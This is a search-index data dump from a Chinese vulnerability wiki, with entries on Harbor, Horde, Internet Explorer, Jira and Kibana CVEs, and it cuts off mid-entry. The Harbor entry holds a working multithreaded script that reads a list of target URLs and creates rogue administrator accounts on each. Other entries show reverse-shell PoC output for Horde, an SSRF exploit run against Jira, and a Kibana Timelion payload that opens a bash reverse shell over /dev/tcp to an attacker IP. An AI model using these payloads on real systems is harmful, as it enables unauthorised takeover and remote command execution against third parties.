https://unit42.paloaltonetworks.com/critical-vulnerability-in-harbor-enables-privilege-escalation-from-zero-to-admin-cve-2019-16097/","title":"CVE-2019-16097-batch"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/CVE-2019-16097/#cve-2019-16097-batch","text":"","title":"CVE-2019-16097-batch"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/CVE-2019-16097/#_1","text":"\u53ea\u505a\u5b89\u5168\u7814\u7a76\u4f7f\u7528\uff0c\u4e0d\u5f97\u505a\u975e\u6cd5\u6d4b\u8bd5\uff0c\u540e\u679c\u81ea\u884c\u627f\u62c5\uff01\uff01\uff01 CVE-2019-16097-batch \u6279\u91cf\u6f0f\u6d1e\u5229\u7528\u811a\u672c \u5728 url.txt\u6587\u4ef6 \u6279\u91cf\u6dfb\u52a0\u76ee\u6807\u5730\u5740 http://1.1.1.1 http://2.2.2.2 \u4f7f\u7528python \u8fd0\u884c \u6b64\u811a\u672c \u5728 result.txt \u53ef\u4ee5\u770b\u5230\u6700\u7ec8\u7684\u9a8c\u8bc1\u7ed3\u679c","title":"\u514d\u8d23\u58f0\u660e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/CVE-2019-16097/#_2","text":"\u8fd1\u65e5\uff0c\u955c\u50cf\u4ed3\u5e93Harbor\u7206\u51fa\u4efb\u610f\u7ba1\u7406\u5458\u6ce8\u518c\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u5728\u8bf7\u6c42\u4e2d\u6784\u9020\u7279\u5b9a\u5b57\u7b26\u4e32\uff0c\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u76f4\u63a5\u521b\u5efa\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u4ece\u800c\u63a5\u7ba1Harbor\u955c\u50cf\u4ed3\u5e93\u3002\u6211\u4eec\u5f97\u5230\u6d88\u606f\uff0c\u7b2c\u4e00\u65f6\u95f4\u5bf9\u8be5\u6f0f\u6d1e\u8fdb\u4e86\u9a8c\u8bc1\uff0c\u5b98\u65b9\u5df2\u53d1\u5e03\u516c\u544a\u8bf4\u660e\uff0c\u6700\u65b0\u76841.7.6\u548c1.8.3\u5df2\u4fee\u590d\u6b64\u6f0f\u6d1e\uff0c\u8bf7\u4f7f\u7528\u5230\u7684\u7528\u6237\u5c3d\u5feb\u5347\u7ea7\u81f3\u5b89\u5168\u7248\u672c\u3002","title":"\u6f0f\u6d1e\u80cc\u666f"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/CVE-2019-16097/#_3","text":"Harbor\u662f\u4e00\u4e2a\u7528\u4e8e\u5b58\u50a8\u548c\u5206\u53d1Docker\u955c\u50cf\u7684\u4f01\u4e1a\u7ea7Registry\u670d\u52a1\u5668\u3002Harbor 1.7.0\u7248\u672c\u81f31.8.2\u7248\u672c\u4e2d\u7684core/api/user.go\u6587\u4ef6\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u901a\u8fc7\u5728\u8bf7\u6c42\u4e2d\u6dfb\u52a0\u5173\u952e\u53c2\u6570\uff0c\u5373\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u521b\u5efa\u7ba1\u7406\u5458\u8d26\u6237\uff0c\u4ece\u800c\u63a5\u7ba1Harbor\u955c\u50cf\u4ed3\u5e93\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/CVE-2019-16097/#_4","text":"Harbor 1.7.0\u7248\u672c\u81f31.8.2\u7248\u672c","title":"\u5f71\u54cd\u7248\u672c"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/CVE-2019-16097/#_5","text":"\u6211\u4eec\u901a\u8fc7\u7f16\u5199\u6279\u91cf\u9a8c\u8bc1\u811a\u672c\uff0c\u6210\u529f\u590d\u73b0\u4e86\u8be5\u6f0f\u6d1e\u3002 \u811a\u672cgithub\u83b7\u53d6","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/CVE-2019-16097/#_6","text":"\u5347\u7ea7Harbor\u7248\u672c\u5230 1.7.6 \u548c 1.8.3 \u53c2\u8003\u4e0b\u8f7d\u94fe\u63a5\uff1a https://github.com/goharbor/harbor/releases","title":"\u5b89\u5168\u5efa\u8bae"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/CVE-2019-16097/#_7","text":"https://github.com/evilAdan0s/CVE-2019-16097 https://github.com/goharbor/harbor/issues/8951 https://unit42.paloaltonetworks.com/critical-vulnerability-in-harbor-enables-privilege-escalation-from-zero-to-admin-cve-2019-16097/","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E/","text":"\u5f71\u54cd\u7248\u672c \u00b6 Harbor 1.7.0\u7248\u672c\u81f31.8.2\u7248\u672c \u4e0d\u53d7\u5f71\u54cd\u7248\u672c \u00b6 Harbor>= 1.7.6 Harbor>= 1.8.3 \u590d\u73b0\u4e4b\u73af\u5883\u51c6\u5907 \u00b6 1.Cenos7\u5b89\u88c5\u597ddocker\u548cdocker-compose 2.\u4e0b\u8f7d\u5e76\u5b89\u88c5harbor1.8.1\u5728\u7ebf\u5b89\u88c5\u7248\u672c wget https://storage.googleapis.com/harbor-releases/release-1.8.0/harbor-online-installer-v1.8.1.tgz tar xvf harbor-online-installer-v1.8.0.tgz cd harbor vi harbor.yml \u4fee\u6539hostname\u4e3a\u5b89\u88c5Harbor\u673a\u5668\u7684IP\u5730\u5740\u3002 \u5b89\u88c5harbor ./install.sh \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6ce8\u518c\u4e00\u4e2aHarbor\u5e10\u53f7\uff0c\u586b\u5199\u5bc6\u7801\u65f6\u6ce8\u610f\u8981\u7b26\u5408\u89c4\u8303 \u5bf9\u6ce8\u518c\u4fe1\u606f\u8fdb\u884c\u6293\u5305\u4fee\u6539\uff0c\u5728post\u6570\u636e\u540e\u9762\u6dfb\u52a0\u201dhas_admin_role\u201d:true \u67e5\u770b[Response]\uff0c\u8fd4\u56de201,\u8bf4\u660e\u5199\u5165\u6210\u529f\u3002 \u4f7f\u7528admin\u5e10\u53f7\u8fdb\u5165\u540e\u53d1\u73b0\uff0c\u5df2\u7ecf\u6210\u529f\u5199\u5165\u5e10\u53f7\uff0c\u5e76\u4e14\u4e3a\u7ba1\u7406\u5458\u6743\u9650\u3002 \u6279\u91cf\u5229\u7528poc \u00b6 import requests import threading import logging data='{\"username\":\"biubiubiu\",\"email\":\"biubiubiu11@qq.com\",\"realname\":\"biubiu1biu\",\"password\":\"Aa111111\",\"comment\":\"biubiubiu\",\"has_admin_role\":true}' headers={\"Content-Type\": \"application/json\"} def poc(url): pwn_url=url+\"/api/users\" payload=data try: r=requests.post(pwn_url, data=payload,headers=headers,timeout=10) print(pwn_url) print(r.status_code) if r.status_code == 201: print(\"\\n\\n you has created a user,username=biubiubiu,password=Aa111111\") f.write(url+\" The URL has created a user,username=biubiubiu,password=Aa111111\") else: print(\"The vulnerability does not exist on the website or the account name has been written\") except Exception as e: logging.warning(pwn_url) print(e) if __name__ == '__main__': print (\"this is a CVE-2019-16097 poc\") print(\"more cve-2019-16097 info welcome to https://www.lstazl.com\") f=open(\"results.txt\",\"a\") url_list=[i.replace(\"\\n\",\"\") for i in open(\"urls.txt\",\"r\").readlines()] for url in url_list: threading.Thread(target=poc,args=(url,)).start() while 1: if (len(threading.enumerate())<50): break 1.\u5728urls.txt\u4e2d\u6dfb\u52a0\u4f60\u8981\u68c0\u6d4b\u7684url 2.python3\u73af\u5883\u4e0b\u8fd0\u884ccve-2019-16097\u811a\u672c python3 cve-2019-16097.py 3.\u6279\u91cf\u68c0\u6d4b\u5b8c\u6210\u540e\u518dresults\u4e2d\u67e5\u770b\u6210\u529f\u5199\u5165\u8d26\u53f7\u7684url\u3002","title":"Harbor\u4efb\u610f\u7ba1\u7406\u5458\u6ce8\u518c\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E/#_1","text":"Harbor 1.7.0\u7248\u672c\u81f31.8.2\u7248\u672c","title":"\u5f71\u54cd\u7248\u672c"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E/#_2","text":"Harbor>= 1.7.6 Harbor>= 1.8.3","title":"\u4e0d\u53d7\u5f71\u54cd\u7248\u672c"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E/#_3","text":"1.Cenos7\u5b89\u88c5\u597ddocker\u548cdocker-compose 2.\u4e0b\u8f7d\u5e76\u5b89\u88c5harbor1.8.1\u5728\u7ebf\u5b89\u88c5\u7248\u672c wget https://storage.googleapis.com/harbor-releases/release-1.8.0/harbor-online-installer-v1.8.1.tgz tar xvf harbor-online-installer-v1.8.0.tgz cd harbor vi harbor.yml \u4fee\u6539hostname\u4e3a\u5b89\u88c5Harbor\u673a\u5668\u7684IP\u5730\u5740\u3002 \u5b89\u88c5harbor ./install.sh","title":"\u590d\u73b0\u4e4b\u73af\u5883\u51c6\u5907"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E/#_4","text":"\u6ce8\u518c\u4e00\u4e2aHarbor\u5e10\u53f7\uff0c\u586b\u5199\u5bc6\u7801\u65f6\u6ce8\u610f\u8981\u7b26\u5408\u89c4\u8303 \u5bf9\u6ce8\u518c\u4fe1\u606f\u8fdb\u884c\u6293\u5305\u4fee\u6539\uff0c\u5728post\u6570\u636e\u540e\u9762\u6dfb\u52a0\u201dhas_admin_role\u201d:true \u67e5\u770b[Response]\uff0c\u8fd4\u56de201,\u8bf4\u660e\u5199\u5165\u6210\u529f\u3002 \u4f7f\u7528admin\u5e10\u53f7\u8fdb\u5165\u540e\u53d1\u73b0\uff0c\u5df2\u7ecf\u6210\u529f\u5199\u5165\u5e10\u53f7\uff0c\u5e76\u4e14\u4e3a\u7ba1\u7406\u5458\u6743\u9650\u3002","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E/#poc","text":"import requests import threading import logging data='{\"username\":\"biubiubiu\",\"email\":\"biubiubiu11@qq.com\",\"realname\":\"biubiu1biu\",\"password\":\"Aa111111\",\"comment\":\"biubiubiu\",\"has_admin_role\":true}' headers={\"Content-Type\": \"application/json\"} def poc(url): pwn_url=url+\"/api/users\" payload=data try: r=requests.post(pwn_url, data=payload,headers=headers,timeout=10) print(pwn_url) print(r.status_code) if r.status_code == 201: print(\"\\n\\n you has created a user,username=biubiubiu,password=Aa111111\") f.write(url+\" The URL has created a user,username=biubiubiu,password=Aa111111\") else: print(\"The vulnerability does not exist on the website or the account name has been written\") except Exception as e: logging.warning(pwn_url) print(e) if __name__ == '__main__': print (\"this is a CVE-2019-16097 poc\") print(\"more cve-2019-16097 info welcome to https://www.lstazl.com\") f=open(\"results.txt\",\"a\") url_list=[i.replace(\"\\n\",\"\") for i in open(\"urls.txt\",\"r\").readlines()] for url in url_list: threading.Thread(target=poc,args=(url,)).start() while 1: if (len(threading.enumerate())<50): break 1.\u5728urls.txt\u4e2d\u6dfb\u52a0\u4f60\u8981\u68c0\u6d4b\u7684url 2.python3\u73af\u5883\u4e0b\u8fd0\u884ccve-2019-16097\u811a\u672c python3 cve-2019-16097.py 3.\u6279\u91cf\u68c0\u6d4b\u5b8c\u6210\u540e\u518dresults\u4e2d\u67e5\u770b\u6210\u529f\u5199\u5165\u8d26\u53f7\u7684url\u3002","title":"\u6279\u91cf\u5229\u7528poc"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Horde%20Groupware/Horde%20Groupware%20Webmail%20Edition%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","text":"saturn:~$./poc.py 172.16.175.148/horde/ hordeuser:pass123 172.16.175.145 (+) targeting http://172.16.175.145/horde/ (+) obtained session iefankvohbl8og0mtaadm3efb6 (+) inserted our php object (+) triggering deserialization... (+) starting handler on port 1337 (+) connection from 172.16.175.145 (+) pop thy shell! id uid=33(www-data) gid=33(www-data) groups=33(www-data) pwd /var/www/horde/services poc \u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1-P-9IUMpHKZDIXELIFIOJg \u63d0\u53d6\u7801\uff1adgne","title":"Horde Groupware Webmail Edition \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/IE%E6%B5%8F%E8%A7%88%E5%99%A8/IE%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u7f16\u53f7\uff1aCVE-2020-1092 \u6f0f\u6d1e\u7ea7\u522b\uff1a\u9ad8\u5371 \u6f0f\u6d1e\u63cf\u8ff0\uff1a \u00b6 IE9\u548cIE11\u7248\u672c\u4e2d\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u7a0b\u5e8f\u672a\u80fd\u6b63\u786e\u8bbf\u95ee\u5185\u5b58\u5bf9\u8c61\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u5f53\u524d\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff0c\u7834\u574f\u5185\u5b58\u3002 \u5f71\u54cd\u8303\u56f4\uff1a \u00b6 IE9\u548cIE11 \u7f13\u89e3\u63aa\u65bd\uff1a \u00b6 \u5382\u5546\u5df2\u53d1\u5e03\u5347\u7ea7\u8865\u4e01\uff0c\u8865\u4e01\u83b7\u53d6\u5730\u5740\uff1a https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisor/CVE-2020-1092","title":"IE\u6d4f\u89c8\u5668\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/IE%E6%B5%8F%E8%A7%88%E5%99%A8/IE%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"IE9\u548cIE11\u7248\u672c\u4e2d\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u7a0b\u5e8f\u672a\u80fd\u6b63\u786e\u8bbf\u95ee\u5185\u5b58\u5bf9\u8c61\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u5f53\u524d\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff0c\u7834\u574f\u5185\u5b58\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/IE%E6%B5%8F%E8%A7%88%E5%99%A8/IE%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","text":"IE9\u548cIE11","title":"\u5f71\u54cd\u8303\u56f4\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/IE%E6%B5%8F%E8%A7%88%E5%99%A8/IE%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_3","text":"\u5382\u5546\u5df2\u53d1\u5e03\u5347\u7ea7\u8865\u4e01\uff0c\u8865\u4e01\u83b7\u53d6\u5730\u5740\uff1a https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisor/CVE-2020-1092","title":"\u7f13\u89e3\u63aa\u65bd\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Jira/CVE-2019-8451/","text":"CVE-2019-8451 Jira\u672a\u6388\u6743SSRF\u6f0f\u6d1e \u00b6 python usage \u00b6 \u811a\u672cgithub\u83b7\u53d6 python CVE-2019-8451.py http://www.jas502n.com:8080 root@kali:~/CVE-2019-8451# python CVE-2019-8451.py http://www.jas502n.com:8080 >>>>SSRF URL: www.baidu.com >>>>Send poc Success! X-AUSERNAME= anonymous >>>>vuln_url= http://www.jas502n.com:8080/plugins/servlet/gadgets/makeRequest?url=http://www.jas502n.com:8080@www.baidu.com throw 1; < don't be evil' >{\"http://www.jas502n.com:8080@www.baidu.com\":{\"rc\":200,\"headers\":{\"set-cookie\":[\"BDORZ=27315; max-age=86400; domain=.baidu.com; path=/\"]},\"body\":\"<!DOCTYPE html>\\r\\n<!--STATUS OK--><html> <head><meta http-equiv=content-type content=text/html;charset=utf-8><meta http-equiv=X-UA-Compatible content=IE=Edge><meta content=always name=referrer><link rel=stylesheet type=text/css href=http://s1.bdstatic.com/r/www/cache/bdorz/baidu.min.css><title>\u767e\u5ea6\u4e00\u4e0b\uff0c\u4f60\u5c31\u77e5\u9053<\\/title><\\/head> <body link=#0000cc> <div id=wrapper> <div id=head> <div class=head_wrapper> <div class=s_form> <div class=s_form_wrapper> <div id=lg> <img hidefocus=true src=//www.baidu.com/img/bd_logo1.png width=270 height=129> <\\/div> <form id=form name=f action=//www.baidu.com/s class=fm> <input type=hidden name=bdorz_come value=1> <input type=hidden name=ie value=utf-8> <input type=hidden name=f value=8> <input type=hidden name=rsv_bp value=1> <input type=hidden name=rsv_idx value=1> <input type=hidden name=tn value=baidu><span class=\\\"bg s_ipt_wr\\\"><input id=kw name=wd class=s_ipt value maxlength=255 autocomplete=off autofocus><\\/span><span class=\\\"bg s_btn_wr\\\"><input type=submit id=su value=\u767e\u5ea6\u4e00\u4e0b class=\\\"bg s_btn\\\"><\\/span> <\\/form> <\\/div> <\\/div> <div id=u1> <a href=http://news.baidu.com name=tj_trnews class=mnav>\u65b0\u95fb<\\/a> <a href=http://www.hao123.com name=tj_trhao123 class=mnav>hao123<\\/a> <a href=http://map.baidu.com name=tj_trmap class=mnav>\u5730\u56fe<\\/a> <a href=http://v.baidu.com name=tj_trvideo class=mnav>\u89c6\u9891<\\/a> <a href=http://tieba.baidu.com name=tj_trtieba class=mnav>\u8d34\u5427<\\/a> <noscript> <a href=http://www.baidu.com/bdorz/login.gif?login&amp;tpl=mn&amp;u=http%3A%2F%2Fwww.baidu.com%2f%3fbdorz_come%3d1 name=tj_login class=lb>\u767b\u5f55<\\/a> <\\/noscript> <script>document.write('<a href=\\\"http://www.baidu.com/bdorz/login.gif?login&tpl=mn&u='+ encodeURIComponent(window.location.href+ (window.location.search === \\\"\\\" ? \\\"?\\\" : \\\"&\\\")+ \\\"bdorz_come=1\\\")+ '\\\" name=\\\"tj_login\\\" class=\\\"lb\\\">\u767b\u5f55<\\/a>');<\\/script> <a href=//www.baidu.com/more/ name=tj_briicon class=bri style=\\\"display: block;\\\">\u66f4\u591a\u4ea7\u54c1<\\/a> <\\/div> <\\/div> <\\/div> <div id=ftCon> <div id=ftConw> <p id=lh> <a href=http://home.baidu.com>\u5173\u4e8e\u767e\u5ea6<\\/a> <a href=http://ir.baidu.com>About Baidu<\\/a> <\\/p> <p id=cp>&copy;2017&nbsp;Baidu&nbsp;<a href=http://www.baidu.com/duty/>\u4f7f\u7528\u767e\u5ea6\u524d\u5fc5\u8bfb<\\/a>&nbsp; <a href=http://jianyi.baidu.com/ class=cp-feedback>\u610f\u89c1\u53cd\u9988<\\/a>&nbsp;\u4eacICP\u8bc1030173\u53f7&nbsp; <img src=//www.baidu.com/img/gs.gif> <\\/p> <\\/div> <\\/div> <\\/div> <\\/body> <\\/html>\\r\\n\"}} >>>>SSRF URL: 0x01 SSRF in the /plugins/servlet/gadgets/makeRequest resource - CVE-2019-8451 \u00b6 The /plugins/servlet/gadgets/makeRequest resource in Jira before version 8.4.0 allows remote attackers to access the content of internal network resources via a Server Side Request Forgery (SSRF) vulnerability due to a logic bug in the JiraWhitelist class. Fixed in Version/s: 8.4.0 \u53c2\u8003\u94fe\u63a5 \u00b6 https://mp.weixin.qq.com/s/_Tsq9p1pQyszJt2VaXd61A https://jira.atlassian.com/browse/JRASERVER-69793 \u6765\u6e90 \u00b6 https://github.com/jas502n/CVE-2019-8451","title":"CVE-2019-8451 Jira\u672a\u6388\u6743SSRF\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Jira/CVE-2019-8451/#cve-2019-8451-jirassrf","text":"","title":"CVE-2019-8451 Jira\u672a\u6388\u6743SSRF\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Jira/CVE-2019-8451/#python-usage","text":"\u811a\u672cgithub\u83b7\u53d6 python CVE-2019-8451.py http://www.jas502n.com:8080 root@kali:~/CVE-2019-8451# python CVE-2019-8451.py http://www.jas502n.com:8080 >>>>SSRF URL: www.baidu.com >>>>Send poc Success! X-AUSERNAME= anonymous >>>>vuln_url= http://www.jas502n.com:8080/plugins/servlet/gadgets/makeRequest?url=http://www.jas502n.com:8080@www.baidu.com throw 1; < don't be evil' >{\"http://www.jas502n.com:8080@www.baidu.com\":{\"rc\":200,\"headers\":{\"set-cookie\":[\"BDORZ=27315; max-age=86400; domain=.baidu.com; path=/\"]},\"body\":\"<!DOCTYPE html>\\r\\n<!--STATUS OK--><html> <head><meta http-equiv=content-type content=text/html;charset=utf-8><meta http-equiv=X-UA-Compatible content=IE=Edge><meta content=always name=referrer><link rel=stylesheet type=text/css href=http://s1.bdstatic.com/r/www/cache/bdorz/baidu.min.css><title>\u767e\u5ea6\u4e00\u4e0b\uff0c\u4f60\u5c31\u77e5\u9053<\\/title><\\/head> <body link=#0000cc> <div id=wrapper> <div id=head> <div class=head_wrapper> <div class=s_form> <div class=s_form_wrapper> <div id=lg> <img hidefocus=true src=//www.baidu.com/img/bd_logo1.png width=270 height=129> <\\/div> <form id=form name=f action=//www.baidu.com/s class=fm> <input type=hidden name=bdorz_come value=1> <input type=hidden name=ie value=utf-8> <input type=hidden name=f value=8> <input type=hidden name=rsv_bp value=1> <input type=hidden name=rsv_idx value=1> <input type=hidden name=tn value=baidu><span class=\\\"bg s_ipt_wr\\\"><input id=kw name=wd class=s_ipt value maxlength=255 autocomplete=off autofocus><\\/span><span class=\\\"bg s_btn_wr\\\"><input type=submit id=su value=\u767e\u5ea6\u4e00\u4e0b class=\\\"bg s_btn\\\"><\\/span> <\\/form> <\\/div> <\\/div> <div id=u1> <a href=http://news.baidu.com name=tj_trnews class=mnav>\u65b0\u95fb<\\/a> <a href=http://www.hao123.com name=tj_trhao123 class=mnav>hao123<\\/a> <a href=http://map.baidu.com name=tj_trmap class=mnav>\u5730\u56fe<\\/a> <a href=http://v.baidu.com name=tj_trvideo class=mnav>\u89c6\u9891<\\/a> <a href=http://tieba.baidu.com name=tj_trtieba class=mnav>\u8d34\u5427<\\/a> <noscript> <a href=http://www.baidu.com/bdorz/login.gif?login&amp;tpl=mn&amp;u=http%3A%2F%2Fwww.baidu.com%2f%3fbdorz_come%3d1 name=tj_login class=lb>\u767b\u5f55<\\/a> <\\/noscript> <script>document.write('<a href=\\\"http://www.baidu.com/bdorz/login.gif?login&tpl=mn&u='+ encodeURIComponent(window.location.href+ (window.location.search === \\\"\\\" ? \\\"?\\\" : \\\"&\\\")+ \\\"bdorz_come=1\\\")+ '\\\" name=\\\"tj_login\\\" class=\\\"lb\\\">\u767b\u5f55<\\/a>');<\\/script> <a href=//www.baidu.com/more/ name=tj_briicon class=bri style=\\\"display: block;\\\">\u66f4\u591a\u4ea7\u54c1<\\/a> <\\/div> <\\/div> <\\/div> <div id=ftCon> <div id=ftConw> <p id=lh> <a href=http://home.baidu.com>\u5173\u4e8e\u767e\u5ea6<\\/a> <a href=http://ir.baidu.com>About Baidu<\\/a> <\\/p> <p id=cp>&copy;2017&nbsp;Baidu&nbsp;<a href=http://www.baidu.com/duty/>\u4f7f\u7528\u767e\u5ea6\u524d\u5fc5\u8bfb<\\/a>&nbsp; <a href=http://jianyi.baidu.com/ class=cp-feedback>\u610f\u89c1\u53cd\u9988<\\/a>&nbsp;\u4eacICP\u8bc1030173\u53f7&nbsp; <img src=//www.baidu.com/img/gs.gif> <\\/p> <\\/div> <\\/div> <\\/div> <\\/body> <\\/html>\\r\\n\"}} >>>>SSRF URL:","title":"python usage"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Jira/CVE-2019-8451/#0x01-ssrf-in-the-pluginsservletgadgetsmakerequest-resource-cve-2019-8451","text":"The /plugins/servlet/gadgets/makeRequest resource in Jira before version 8.4.0 allows remote attackers to access the content of internal network resources via a Server Side Request Forgery (SSRF) vulnerability due to a logic bug in the JiraWhitelist class. Fixed in Version/s: 8.4.0","title":"0x01 SSRF in the /plugins/servlet/gadgets/makeRequest resource - CVE-2019-8451"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Jira/CVE-2019-8451/#_1","text":"https://mp.weixin.qq.com/s/_Tsq9p1pQyszJt2VaXd61A https://jira.atlassian.com/browse/JRASERVER-69793","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Jira/CVE-2019-8451/#_2","text":"https://github.com/jas502n/CVE-2019-8451","title":"\u6765\u6e90"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Kibana/CVE-2019-7609-kibana%E4%BD%8E%E4%BA%8E6.6.0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","text":"CVE-2019-7609-kibana<6.6.0\u672a\u6388\u6743\u8fdc\u7a0b\u4ee3\u7801\u547d\u4ee4\u6267\u884c \u00b6 POC \u00b6 \u5c06POC\u91cc\u7684\u53cd\u94feIP\u5730\u5740\u6362\u6210\u81ea\u5df1\u7684\uff0c\u7136\u540e\u5728\u76ee\u6807\u673a\u5668\u4e0a\u7684 Timelion \u9009\u9879\u4e0b\u5c06\u4ee5\u4e0b POC \u7c98\u8d34\u8fdb\u53bb\uff0c\u7136\u540e\u70b9\u51fb Run \u8fd0\u884c\uff1a .es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"bash -i >& /dev/tcp/10.10.20.166/8989 0>&1\");process.exit()//') .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ') \u7136\u540e\u81ea\u5df1\u673a\u5668\u5f00\u542f\u76d1\u542c\uff0c\u518d\u70b9\u51fb Canvas \u5373\u53ef\u51fa\u53d1\u6f0f\u6d1e\u3002","title":"CVE 2019 7609 